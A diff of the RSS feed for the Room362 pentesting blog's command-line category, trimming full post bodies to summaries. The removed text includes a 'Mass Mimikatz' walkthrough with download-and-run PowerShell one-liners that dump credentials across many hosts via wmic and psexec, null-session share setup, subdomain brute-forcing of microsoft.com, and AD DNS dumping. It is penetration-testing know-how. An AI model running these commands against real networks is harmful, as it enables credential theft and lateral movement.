@@ -1,13 +1,16 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Room362</title>
-    <link>https://room362.com/categories/cli/index.xml</link>
-    <description>Recent content on Room362</description>
+    <title>Cli on Room362</title>
+    <link>https://room362.com/categories/cli/</link>
+    <description>Recent content in Cli on Room362</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&amp;copy; 2016. All rights reserved.</copyright>
-    <atom:link href="https://room362.com/categories/cli/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 29 Jan 2014 18:07:08 -0500</lastBuildDate>
+    
+	<atom:link href="https://room362.com/categories/cli/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>Hostname bruteforcing on the cheap</title>
@@ -15,186 +18,8 @@
       <pubDate>Wed, 29 Jan 2014 18:07:08 -0500</pubDate>
       
       <guid>https://room362.com/post/2014/2014-01-29-hostname-bruteforcing-on-the-cheap/</guid>
-      <description>&lt;hr /&gt;
-
-&lt;p&gt;&lt;strong&gt;Quick update&lt;/strong&gt;: As &lt;a href=&#34;http://twitter.com/mikedamm&#34;&gt;@MikeDamm&lt;/a&gt; &lt;a href=&#34;http://twitter.com/mikedamm/status/428725199068864512&#34;&gt;points out&lt;/a&gt;, xargs has a &lt;code&gt;-P&lt;/code&gt; option that can do the same thing I&amp;rsquo;m using parallel for. If you have a supported version of xargs you can use &lt;code&gt;-P 0&lt;/code&gt; to do the same thing as &lt;code&gt;-j0&lt;/code&gt; with parallel, but if your version doesn&amp;rsquo;t support the &lt;code&gt;0&lt;/code&gt; you can simply use the same number parallel uses ala:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;cat subdomains.txt | xargs -P 122 -I subdomain dig +noall subdomain.microsoft.com +answer&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;This results in roughly the same completion time as it&amp;rsquo;s parallel counterpart. Thanks @MikeDamm!&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;There are some great discussions on the NoVA Hackers mailing list. One such discussion was about what the best way to do dns hostname brute forcing was and which tool is better than another. For me, I just use the command line and then parse the results (or just ask the deepmagic.com database ;-)&lt;/p&gt;
-
-&lt;p&gt;Here is what I do:&lt;/p&gt;
-
-&lt;p&gt;First, you need a good list of DNS sub domains / hostnames. Personally I use the list provided over at &lt;a href=&#34;http://www.ethicalhack3r.co.uk/zone-transfers-on-the-alexa-top-1-million/&#34;&gt;http://www.ethicalhack3r.co.uk/zone-transfers-on-the-alexa-top-1-million/&lt;/a&gt; (with a few minor tweaks). If you haven&amp;rsquo;t read that post and follow-on posts you really should. But take the list and save it locally. Then just run the following command:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;cat subdomains.txt | xargs -t -I subdomain dig +noall subdomain.microsoft.com +answer&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Now, xargs is great but does one thing at a time and can be quite slow if your subdomains list is large. With the use of the amazing tool GNU parallel you can get done in a matter of seconds, well, that or knock over your home router.&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;cat subdomains.txt | parallel -k -j0 dig +noall {}.microsoft.com +answer&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Warning: the -j0 option maxes out the possible file handles and jobs that your CPU/kernel can handle, which usually destroys VMs. Just a smaller job count like 100 or 50 if you want the speed without the crash ;-)&lt;/p&gt;
-
-&lt;p&gt;with an output something list this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;parallel: Warning: Only enough file handles to run 122 jobs in parallel.
-Raising ulimit -n or /etc/security/limits.conf may help.
-parallel: Warning: No more file handles. Raising ulimit -n or /etc/security/limits.conf may help.
-mail.microsoft.com.	2369	IN	A	131.107.125.5
-www.microsoft.com.	0	IN	CNAME	toggle.www.ms.akadns.net.
-toggle.www.ms.akadns.net. 0	IN	CNAME	g.www.ms.akadns.net.
-g.www.ms.akadns.net.	0	IN	CNAME	lb1.www.ms.akadns.net.
-lb1.www.ms.akadns.net.	263	IN	A	64.4.11.42
-m.microsoft.com.	0	IN	CNAME	origin.mobile.ms.akadns.net.
-origin.mobile.ms.akadns.net. 300 IN	A	65.55.186.235
-ftp.microsoft.com.	0	IN	CNAME	ftp.microsoft.akadns.net.
-ftp.microsoft.akadns.net. 259	IN	A	64.4.17.176
-mobile.microsoft.com.	0	IN	CNAME	origin.mobile.ms.akadns.net.
-origin.mobile.ms.akadns.net. 300 IN	A	65.55.186.235
-smtp.microsoft.com.	3600	IN	A	131.107.115.215
-smtp.microsoft.com.	3600	IN	A	131.107.115.214
-smtp.microsoft.com.	3600	IN	A	205.248.106.64
-smtp.microsoft.com.	3600	IN	A	205.248.106.30
-smtp.microsoft.com.	3600	IN	A	205.248.106.32
-smtp.microsoft.com.	3600	IN	A	131.107.115.212
-search.microsoft.com.	0	IN	CNAME	search.microsoft.akadns.net.
-search.microsoft.akadns.net. 0	IN	CNAME	search.msn.com.edgesuite.net.
-search.msn.com.edgesuite.net. 0	IN	CNAME	a134.g.akamai.net.
-a134.g.akamai.net.	19	IN	A	209.107.220.27
-a134.g.akamai.net.	19	IN	A	209.107.220.35
-dev.microsoft.com.	0	IN	CNAME	msdn.microsoft.com.
-msdn.microsoft.com.	0	IN	CNAME	msdn.microsoft.akadns.net.
-msdn.microsoft.akadns.net. 600	IN	A	157.56.148.19
-img.microsoft.com.	0	IN	CNAME	i.microsoft.com.edgesuite.net.
-i.microsoft.com.edgesuite.net. 0 IN	CNAME	a1475.g.akamai.net.
-a1475.g.akamai.net.	20	IN	A	165.254.158.48
-a1475.g.akamai.net.	20	IN	A	165.254.158.9
-news.microsoft.com.	0	IN	CNAME	msnews.microsoft.com.
-msnews.microsoft.com.	3600	IN	A	207.46.248.16
-mail2.microsoft.com.	3600	IN	A	131.107.115.215
-beta.microsoft.com.	0	IN	CNAME	connect.microsoft.akadns.net.
-connect.microsoft.akadns.net. 300 IN	A	65.52.103.84
-support.microsoft.com.	0	IN	CNAME	mso-geo.microsoft.akadns.net.
-mso-geo.microsoft.akadns.net. 0	IN	CNAME	support.microsoft.akadns.net.
-support.microsoft.akadns.net. 175 IN	A	157.56.56.139
-my.microsoft.com.	3600	IN	A	134.170.255.29
-help.microsoft.com.	0	IN	CNAME	help.msn.com.
-mail3.microsoft.com.	3600	IN	A	131.107.115.214
-download.microsoft.com.	0	IN	CNAME	download.microsoft.com.nsatc.net.
-download.microsoft.com.nsatc.net. 0 IN	CNAME	main.dl.ms.akadns.net.
-main.dl.ms.akadns.net.	0	IN	CNAME	download.microsoft.com.edgesuite.net.
-download.microsoft.com.edgesuite.net. 0	IN CNAME a954.dscms.akamai.net.
-a954.dscms.akamai.net.	0	IN	CNAME	a954.dscms.akamai.net.0.1.cn.akamaitech.net.
-a954.dscms.akamai.net.0.1.cn.akamaitech.net. 1 IN A 69.31.75.184
-a954.dscms.akamai.net.0.1.cn.akamaitech.net. 1 IN A 69.31.75.168
-shop.microsoft.com.	3600	IN	A	64.4.11.37
-shop.microsoft.com.	3600	IN	A	65.55.58.201
-games.microsoft.com.	3600	IN	A	207.46.166.10
-business.microsoft.com.	3600	IN	A	65.55.57.98
-ws.microsoft.com.	0	IN	CNAME	ws.microsoft.com.nsatc.net.
-gateway.microsoft.com.	3600	IN	A	131.107.16.142
-gateway.microsoft.com.	3600	IN	A	131.107.16.143
-members.microsoft.com.	0	IN	CNAME	members.microsoft.akadns.net.
-members.microsoft.akadns.net. 219 IN	A	65.55.57.28
-c.microsoft.com.	0	IN	CNAME	c.microsoft.akadns.net.
-c.microsoft.akadns.net.	215	IN	A	65.55.58.199
-g.microsoft.com.	0	IN	CNAME	g.msn.com.
-g.msn.com.		0	IN	CNAME	g.msn.com.nsatc.net.
-g.msn.com.nsatc.net.	142	IN	A	131.253.34.154
-mail4.microsoft.com.	3600	IN	A	205.248.106.64
-mail1.microsoft.com.	3600	IN	A	131.107.115.212
-apps.microsoft.com.	0	IN	CNAME	apps.windows.akadns.net.
-apps.windows.akadns.net. 0	IN	CNAME	services.windows.akadns.net.
-services.windows.akadns.net. 0	IN	CNAME	services-perf.windows.akadns.net.
-services-perf.windows.akadns.net. 46 IN	A	134.170.30.204
-email.microsoft.com.	1989	IN	A	157.55.150.73
-i.microsoft.com.	0	IN	CNAME	i.toggle.www.ms.akadns.net.
-i.toggle.www.ms.akadns.net. 0	IN	CNAME	i.g.www.ms.akadns.net.
-i.g.www.ms.akadns.net.	0	IN	CNAME	i.microsoft.com.edgesuite.net.
-i.microsoft.com.edgesuite.net. 0 IN	CNAME	a1475.g.akamai.net.
-a1475.g.akamai.net.	8	IN	A	23.62.111.114
-a1475.g.akamai.net.	8	IN	A	23.62.111.104
-s.microsoft.com.	0	IN	CNAME	reroute.microsoft.com.
-reroute.microsoft.com.	3600	IN	A	64.4.11.37
-reroute.microsoft.com.	3600	IN	A	65.55.58.201
-community.microsoft.com. 0	IN	CNAME	communities.microsoft.com.
-communities.microsoft.com. 3600	IN	A	64.4.11.37
-communities.microsoft.com. 3600	IN	A	65.55.58.201
-connect.microsoft.com.	0	IN	CNAME	connect.microsoft.akadns.net.
-connect.microsoft.akadns.net. 152 IN	A	65.52.103.84
-rss.microsoft.com.	796	IN	A	65.55.58.201
-rss.microsoft.com.	796	IN	A	64.4.11.37
-home.microsoft.com.	0	IN	CNAME	redir.blu.cb3.glbdns.microsoft.com.
-redir.blu.cb3.glbdns.microsoft.com. 116	IN A	65.55.206.229
-jp.microsoft.com.	3600	IN	A	65.55.58.201
-jp.microsoft.com.	3600	IN	A	64.4.11.37
-labs.microsoft.com.	3600	IN	A	64.4.11.37
-labs.microsoft.com.	3600	IN	A	65.55.58.201
-exchange.microsoft.com.	2120	IN	A	65.55.31.35
-marketing.microsoft.com. 3600	IN	A	207.46.242.110
-mac.microsoft.com.	3600	IN	A	64.4.11.37
-mac.microsoft.com.	3600	IN	A	65.55.58.201
-feeds.microsoft.com.	3600	IN	A	65.55.57.98
-partners.microsoft.com.	0	IN	CNAME	pmc.partners.microsoft.akadns.net.
-pmc.partners.microsoft.akadns.net. 300 IN A	131.107.119.14
-feed.microsoft.com.	0	IN	CNAME	feed.trafficmanager.net.
-feed.trafficmanager.net. 0	IN	CNAME	feedna.cloudapp.net.
-feedna.cloudapp.net.	10	IN	A	65.52.9.172
-partner.microsoft.com.	0	IN	CNAME	portal.partners.microsoft.akadns.net.
-portal.partners.microsoft.akadns.net. 300 IN A	131.107.119.163
-cs.microsoft.com.	0	IN	CNAME	wedcs.trafficmanager.net.
-wedcs.trafficmanager.net. 0	IN	CNAME	wedcseus.cloudapp.net.
-wedcseus.cloudapp.net.	10	IN	A	137.116.48.250
-forums.microsoft.com.	0	IN	CNAME	forums.microsoft.akadns.net.
-forums.microsoft.akadns.net. 600 IN	A	65.52.103.99
-meet.microsoft.com.	3600	IN	A	131.107.1.71
-e.microsoft.com.	3600	IN	A	191.234.1.50
-autodiscover.microsoft.com. 2358 IN	A	131.107.125.5
-im.microsoft.com.	3600	IN	A	131.107.1.75
-sip.microsoft.com.	2228	IN	A	65.55.30.130
-me.microsoft.com.	0	IN	CNAME	edm.cloudapp.net.
-dig: &#39;m..microsoft.com&#39; is not a legal name (empty label)
-billing.microsoft.com.	0	IN	CNAME	paymenthubprod.trafficmanager.net.
-paymenthubprod.trafficmanager.net. 0 IN	CNAME	paymenthubuxprod1.cloudapp.net.
-paymenthubuxprod1.cloudapp.net.	10 IN	A	168.62.198.20
-profile.microsoft.com.	0	IN	CNAME	profile.microsoft.akadns.net.
-profile.microsoft.akadns.net. 335 IN	A	64.4.11.47
-research.microsoft.com.	806	IN	A	131.107.65.14
-sharepoint.microsoft.com. 3463	IN	A	64.4.6.100
-sharepoint.microsoft.com. 3463	IN	A	65.55.39.10
-appdev.microsoft.com.	0	IN	CNAME	appdev.windows.akadns.net.
-appdev.windows.akadns.net. 131	IN	A	134.170.30.200
-newsletters.microsoft.com. 3150	IN	A	207.46.248.35
-advertising.microsoft.com. 0	IN	CNAME	advertising.microsoft.com.nsatc.net.
-advertising.microsoft.com.nsatc.net. 245 IN A	65.52.100.46
-catalog.microsoft.com.	0	IN	CNAME	genuine.microsoft.akadns.net.
-genuine.microsoft.akadns.net. 300 IN	A	65.55.58.177
-social.microsoft.com.	0	IN	CNAME	lb.social.ms.akadns.net.
-lb.social.ms.akadns.net. 54	IN	A	65.52.103.78
-events.microsoft.com.	1776	IN	A	64.4.11.31
-events.microsoft.com.	1776	IN	A	65.55.58.192
-ajax.microsoft.com.	0	IN	CNAME	mscomajax.vo.msecnd.net.
-mscomajax.vo.msecnd.net. 208	IN	A	65.54.81.164
-mscomajax.vo.msecnd.net. 208	IN	A	65.54.81.12
-developer.microsoft.com. 0	IN	CNAME	msdn.microsoft.com.
-msdn.microsoft.com.	0	IN	CNAME	msdn.microsoft.akadns.net.
-msdn.microsoft.akadns.net. 600	IN	A	157.56.148.19
-bbs.microsoft.com.	0	IN	CNAME	transfer.microsoft.com.
-transfer.microsoft.com.	3600	IN	A	64.4.10.152
-backoffice.microsoft.com. 3600	IN	A	64.4.11.37
-backoffice.microsoft.com. 3600	IN	A	65.55.58.201
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+      <description>Quick update: As @MikeDamm points out, xargs has a -P option that can do the same thing I&amp;rsquo;m using parallel for. If you have a supported version of xargs you can use -P 0 to do the same thing as -j0 with parallel, but if your version doesn&amp;rsquo;t support the 0 you can simply use the same number parallel uses ala:
+ cat subdomains.txt | xargs -P 122 -I subdomain dig +noall subdomain.</description>
     </item>
     
     <item>
@@ -203,91 +28,9 @@ backoffice.microsoft.com. 3600	IN	A	65.55.58.201
       <pubDate>Sat, 05 Oct 2013 23:53:52 -0500</pubDate>
       
       <guid>https://room362.com/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/</guid>
-      <description>&lt;p&gt;&lt;a href=&#34;http://clymb3r.wordpress.com/&#34;&gt;clymb3r&lt;/a&gt; recently posted a script called &amp;ldquo;&lt;a href=&#34;https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz&#34;&gt;Invoke-Mimikatz.ps1&lt;/a&gt;&amp;rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL.&lt;/p&gt;
-
-&lt;p&gt;You can very easily use this script directly from an admin command prompt as so:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;(This works REALLY well for Citrix and Kiosk scenarios and it&amp;rsquo;s too hard to type/remember)
-This runs the powershell script by directly pulling it from Github and executing it &amp;ldquo;in memory&amp;rdquo; on your system.&lt;/p&gt;
-
-&lt;p&gt;One of the awesome added capabilities for this script is to run on a list of hosts. as so:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds -ComputerName @(&#39;computer1&#39;, &#39;computer2&#39;)&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This works great as all the output is directly on your system and all executed through Powershell Remoting. &lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/windows/desktop/ee706585(v=vs.85&#34;&gt;Powershell Remoting&lt;/a&gt;.aspx&amp;rdquo;) is pretty much the same as WinRM. This service however is not enabled by default and can be pretty hit or miss on how much any given enterprise uses WinRM. However, it is usually the servers and more important systems that have it enabled more often than not.&lt;/p&gt;
-
-&lt;p&gt;You can find WinRM / PowerShell Remoting by scanning for the service port 47001 as well as the default comm ports for WinRM 5985 (HTTP) and 5986 (HTTPS).&lt;/p&gt;
-
-&lt;p&gt;If you find that your target isn&amp;rsquo;t a WinRM rich environment or you just want more passwords you can take a slightly more painful route, I call it &amp;ldquo;Mass Mimikatz&amp;rdquo;&lt;/p&gt;
-
-&lt;p&gt;Step 1. Make a share, we are doing this so we can not only collect the output of all our computers passwords, but to host the CMD batch file that will run the powershell script:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;cd\
-mkdir open
-net share open=C:\open /grant:everyone,full
-icacls C:\open\ /grant Everyone:(OI)(CI)F /t
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We are setting &amp;ldquo;Everyone&amp;rdquo; permissions on a Share (net share) and NTFS (icacls) level for this to work properly.&lt;/p&gt;
-
-&lt;p&gt;Step 2. Set registry keys. There are two registry keys that we need to set. The first allows Null Sessions to our new share and the second allows null users to have the &amp;ldquo;Everyone&amp;rdquo; token so that we don&amp;rsquo;t have to get crazy with our permissions. I have create a meterpreter script that has a bunch of error checking here: &lt;a href=&#34;https://raw.github.com/mubix/post-exploitation/master/scripts/mass_mimikatz/massmimi_reg.rb&#34;&gt;massmimi_reg.rb&lt;/a&gt;
-or you can just make the following changes&amp;rdquo;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;HKLM\System\CurrentControlSet\services\LanmanServer\Parameters NullSessionShares REG_MULTI_SZ  = open
-HKLM\System\CurrentControlSet\Contol\Lsa &amp;quot;EveryoneIncludesAnonymous&amp;quot; = 1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Step 3. Change directory into new &amp;ldquo;open&amp;rdquo; directory. This is so our uploads and in particular our web server will be hosted out of the correct directory.&lt;/p&gt;
-
-&lt;p&gt;Step 4. Upload powershell script &lt;a href=&#34;https://raw.github.com/mubix/post-exploitation/master/scripts/mass_mimikatz/powermeup.cmd&#34;&gt;powermeup.cmd&lt;/a&gt; - this script will run our hosted Invoke-Mimikatz script on each host:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.127:8080/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCreds &amp;gt; \\192.168.1.127\open\%COMPUTERNAME%.txt 2&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Step 5. Upload &lt;a href=&#34;http://clymb3r.wordpress.com/&#34;&gt;clymb3r&lt;/a&gt;&amp;rsquo;s Invoke-Mimikatz ps1 - Download from &lt;a href=&#34;https://github.com/mattifestation/PowerSploit&#34;&gt;PowerSploit&lt;/a&gt; repo: &lt;a href=&#34;https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#34;&gt;source on github&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Step 6. Upload mongoose: &lt;a href=&#34;http://cesanta.com/downloads.html&#34;&gt;Downloads Page&lt;/a&gt; - Both regular and tiny versions work. This is an awesome, single executable webserver that supports LUA, Sqlite, and WebDAV out of the box. Tiny version is under 100k.&lt;/p&gt;
-
-&lt;p&gt;Step 7. Upload serverlist.txt - This is a line by line list of computer names to use mimikatz on. You&amp;rsquo;ll have to gather this one way or another.&lt;/p&gt;
-
-&lt;p&gt;Step 8. Execute mongoose (from directory with mimikatz.ps1) - This will start a listener with directory listings enabled on port 8080 by default&lt;/p&gt;
-
-&lt;p&gt;Step 9a. Execute wmic:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;wmic /node:@serverlist.txt process call create &amp;quot;\\192.168.92.127\open\powershellme.cmd&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Step 9b. Execute wmic with creds:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;wmic /node:@serverlist.txt /user:PROJECTMENTOR\jdoe /password:ASDqwe123 process call create &amp;quot;\\192.168.92.127\open\powershellme.cmd&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Step 10. Watch as text files full of wonder and joy fill your share.&lt;/p&gt;
-
-&lt;p&gt;You can find the scripts here: &lt;a href=&#34;https://github.com/mubix/post-exploitation/tree/master/scripts/mass_mimikatz&#34;&gt;https://github.com/mubix/post-exploitation/tree/master/scripts/mass_mimikatz&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Don&amp;rsquo;t forget to clean up::&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;kill mongoose process&lt;/li&gt;
-&lt;li&gt;net share open /delete&lt;/li&gt;
-&lt;li&gt;kill/reset registry values&lt;/li&gt;
-&lt;li&gt;delete &amp;ldquo;open&amp;rdquo; directory&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Got a better way of getting this done? Please leave a comment.&lt;/p&gt;
-
-&lt;p&gt;P.S. You could just enable Powershell Remoting for them ;)&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;psexec @serverlist.txt -u [admin account name] -p [admin account password] -h -d powershell.exe &amp;quot;enable-psremoting -force&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201310_multimimi_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-</description>
+      <description>clymb3r recently posted a script called &amp;ldquo;Invoke-Mimikatz.ps1&amp;rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL.
+You can very easily use this script directly from an admin command prompt as so:
+powershell &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds&amp;quot;  (This works REALLY well for Citrix and Kiosk scenarios and it&amp;rsquo;s too hard to type/remember) This runs the powershell script by directly pulling it from Github and executing it &amp;ldquo;in memory&amp;rdquo; on your system.</description>
     </item>
     
     <item>
@@ -296,64 +39,11 @@ HKLM\System\CurrentControlSet\Contol\Lsa &amp;quot;EveryoneIncludesAnonymous&amp
       <pubDate>Fri, 04 Oct 2013 23:47:28 -0500</pubDate>
       
       <guid>https://room362.com/post/2013/2013-10-04-ad-zone-transfers-as-a-user/</guid>
-      <description>&lt;p&gt;&lt;em&gt;cross posted from: &lt;a href=&#34;http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html&#34;&gt;http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;The tired and true method for Zone Transfers are using either nslookup:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;nslookup
-ls -d domain.com.local
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Or dig:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;dig -t AXFR domain.com.local @ns1.domain.com.local
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;In the Windows Enterprise world there are a few more options. If you are a DNS Admin you can use the &amp;lsquo;dnscmd&amp;rsquo; command like so:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;dnscmd /EnumZones
-dnscmd /ZonePrint domain.com.local
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Which is handy if you can pop the DNS server (usually the Domain Controller so you usually have better things to do at that point).&lt;/p&gt;
-
-&lt;p&gt;You can also use PowerShell:&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;PS C:\Users\jdoe&amp;gt; get-wmiobject -ComputerName dc1 -Namespace root\microsoftDNS -Class MicrosoftDNS_ResourceRecord -Filter &amp;quot;domainname=&#39;projectmentor.net&#39;&amp;quot; | select textrepresentation&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Again, this requires you to be a very high privileged account, which is no fun. I need these computer lists as part of my internal / post-exploitation recon, not an end step.&lt;/p&gt;
-
-&lt;p&gt;For the longest time I relied on a very awesome tool called &amp;ldquo;Adfind&amp;rdquo;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;adfind -sc computers_active -csv -nodn -nocsvq -nocsvheader
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This command will output a list of computer accounts that have been active in the last 90 days in a straight line by line format (hence all of the no &amp;ldquo;this&amp;rdquo;and no &amp;ldquo;that&amp;rdquo; flags)&lt;/p&gt;
-
-&lt;p&gt;But that wasn&amp;rsquo;t good enough, this image kept haunting me:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201310_zonetransfer_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;It&amp;rsquo;s Active Directory Explorer by SysInternals. It shows the complete list of DNS records, stored as objects in Active Directory that I was able to get to as a basic domain user. This means all of the static DNS records for the unix systems and mainframes and other systems outside of the purely Windows world are there as well.&lt;/p&gt;
-
-&lt;p&gt;I spent 4 days attempting to write my own script, ldap query, prayer to  get all of the data out but was unsuccessful. On the 5th day I happened upon a very short post saying &amp;ldquo;I did it&amp;rdquo;, as I probably would have written the same. It comes in the form of a PowerShell script that you can find here:&lt;/p&gt;
-
-&lt;p&gt;Code: &lt;a href=&#34;https://github.com/mmessano/PowerShell/blob/master/dns-dump.ps1&#34;&gt;https://github.com/mmessano/PowerShell/blob/master/dns-dump.ps1&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;And is very easy to run:&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;PS C:\Users\jdoe&amp;gt; dns-dump.ps1 -zone projectmentor.net -dc dc1&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;or&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;C:\&amp;gt; powershell -ep bypass -f dnsdump.ps1 -zone projectmentor.net -dc dc1&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;If you put a -csv on the end of those the author has even given you the CSV format which makes the output extremely easy to parse. Now you can throw your list into your tool of choice instead of scanning random IP ranges on the targets network for important stuff you can scan directly against known good hosts.&lt;/p&gt;
-
-&lt;p&gt;&amp;ndash; mubix&lt;/p&gt;
-
-&lt;p&gt;P.S. Yes I realize this isn&amp;rsquo;t actually &amp;ldquo;Zone Transfer&amp;rdquo;s but its close enough&lt;/p&gt;
-</description>
+      <description>cross posted from: http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html
+The tired and true method for Zone Transfers are using either nslookup:
+nslookup ls -d domain.com.local  Or dig:
+dig -t AXFR domain.com.local @ns1.domain.com.local  In the Windows Enterprise world there are a few more options. If you are a DNS Admin you can use the &amp;lsquo;dnscmd&amp;rsquo; command like so:
+dnscmd /EnumZones dnscmd /ZonePrint domain.com.local  Which is handy if you can pop the DNS server (usually the Domain Controller so you usually have better things to do at that point).</description>
     </item>
     
     <item>
@@ -362,18 +52,12 @@ dnscmd /ZonePrint domain.com.local
       <pubDate>Thu, 30 May 2013 02:56:57 +0000</pubDate>
       
       <guid>https://room362.com/post/2013/2013-05-30-query-all-windows-services-config-from-the-command-line-html/</guid>
-      <description>&lt;p&gt;This is how I did it:&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;for /f &amp;quot;tokens=5 delims=&amp;quot; %A in (&#39;reg query HKLM\SYSTEM\CurrentControlSet\Services&#39;) do sc qc %A&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Let me know if you know of a better way.&lt;/p&gt;
-
-&lt;p&gt;If you don&amp;rsquo;t know why this could be important read here:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://www.ihtb.org/security/program.exe-privilege_escalation.txt&#34;&gt;http://www.ihtb.org/security/program.exe-privilege_escalation.txt&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;If you are on a Win7 box or otherwise have the option to use WMI you can use the following command: &lt;code&gt;wmic service get pathname&lt;/code&gt;&lt;/p&gt;
-</description>
+      <description>This is how I did it:
+for /f &amp;quot;tokens=5 delims=&amp;quot; %A in (&#39;reg query HKLM\SYSTEM\CurrentControlSet\Services&#39;) do sc qc %A
+Let me know if you know of a better way.
+If you don&amp;rsquo;t know why this could be important read here:
+http://www.ihtb.org/security/program.exe-privilege_escalation.txt
+If you are on a Win7 box or otherwise have the option to use WMI you can use the following command: wmic service get pathname</description>
     </item>
     
     <item>
@@ -382,19 +66,8 @@ dnscmd /ZonePrint domain.com.local
       <pubDate>Mon, 18 Mar 2013 20:01:44 +0000</pubDate>
       
       <guid>https://room362.com/post/2013/2013-03-18-length-sorting-wordlists/</guid>
-      <description>&lt;p&gt;This is one of those stupid simple things that are easy to forget so I&amp;rsquo;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&amp;rsquo;t have to, but there is times where it&amp;rsquo;s important.&lt;/p&gt;
-
-&lt;p&gt;Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&amp;rsquo;s sorted and usually is best to sort them by most common first so you get earlier hits. However, if you start throwing rules into the mix that equation changes. If you have &amp;ldquo;iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&amp;rdquo; on the 3rd line of your dictionary, testing every possible permutation where you replace an &amp;lsquo;i&amp;rsquo; with a 1 is going to take a very long time.&lt;/p&gt;
-
